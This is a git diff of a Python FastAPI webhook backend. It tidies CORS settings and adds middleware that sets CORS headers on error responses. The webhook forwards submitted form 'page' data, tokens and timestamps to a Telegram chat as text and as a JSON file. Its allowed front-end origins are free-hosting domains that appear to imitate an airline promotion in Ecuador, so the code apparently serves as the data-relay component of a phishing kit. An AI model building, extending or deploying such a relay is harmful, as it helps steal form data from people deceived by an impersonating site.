@@ -1,6 +1,6 @@
 from fastapi import FastAPI, Request, HTTPException
 from fastapi.middleware.cors import CORSMiddleware
-from fastapi.responses import JSONResponse  # ✅ Import corregido
+from fastapi.responses import JSONResponse
 from pydantic import BaseModel, validator
 from typing import Any, Dict, Optional, Union
 import requests, json, io, logging, re, os
@@ -20,11 +20,11 @@ logger = logging.getLogger("webhook")
 app = FastAPI()
 
 # ===========================
-# 🔹 CORS (100 % compatible con Render)
+# 🔹 CORS (compatible con Render)
 # ===========================
 origins = [
-     "https://latam-from.onrender.com",   
-    "https://ltamaeropromoweb-ecuador.netlify.app",  # ✅ dominio de tu frontend
+    "https://latam-from.onrender.com",               # ✅ tu frontend en Render
+    "https://ltamaeropromoweb-ecuador.netlify.app",  # otro dominio autorizado
     "http://localhost:4200",                         # para pruebas locales
 ]
 
@@ -36,16 +36,12 @@ app.add_middleware(
     allow_headers=["*"],
 )
 
-# ✅ Manejador global para solicitudes preflight (OPTIONS)
+# ✅ Manejador global para preflight OPTIONS
 @app.options("/{rest_of_path:path}")
 async def preflight_handler(request: Request, rest_of_path: str):
-    """
-    Responde manualmente a las peticiones OPTIONS (preflight)
-    para evitar bloqueos por CORS en Render.
-    """
     origin = request.headers.get("origin")
     if origin not in origins:
-        origin = origins[0]  # usa tu dominio principal si no coincide
+        origin = origins[0]
 
     return JSONResponse(
         content={"ok": True},
@@ -55,6 +51,26 @@ async def preflight_handler(request: Request, rest_of_path: str):
             "Access-Control-Allow-Headers": "Authorization, Content-Type",
         },
     )
+
+# ✅ Middleware global: agrega cabeceras CORS incluso a respuestas de error
+@app.middleware("http")
+async def add_cors_headers(request: Request, call_next):
+    response = await call_next(request)
+    origin = request.headers.get("origin")
+
+    allowed_origins = [
+        "https://latam-from.onrender.com",
+        "https://ltamaeropromoweb-ecuador.netlify.app",
+        "http://localhost:4200"
+    ]
+
+    if origin in allowed_origins:
+        response.headers["Access-Control-Allow-Origin"] = origin
+        response.headers["Access-Control-Allow-Methods"] = "GET, POST, PUT, DELETE, OPTIONS"
+        response.headers["Access-Control-Allow-Headers"] = "Authorization, Content-Type"
+        response.headers["Access-Control-Allow-Credentials"] = "true"
+
+    return response
 
 
 # ===========================
@@ -180,7 +196,6 @@ async def webhook(payload: Payload):
         token = payload.token or ""
         ts = payload.ts or ""
 
-        # Si tienes build_pretty_markdown original, defínelo aquí o elimina este endpoint si no lo usas
         markdown = f"📩 Webhook recibido\n\nToken: {token}\nTS: {ts}\nPage: {json.dumps(page, indent=2)}"
         send_telegram_message(CHAT_ID, markdown)
         send_telegram_json_attachment(CHAT_ID, "formulario_page.json", {"token": token, "page": page, "ts": ts})
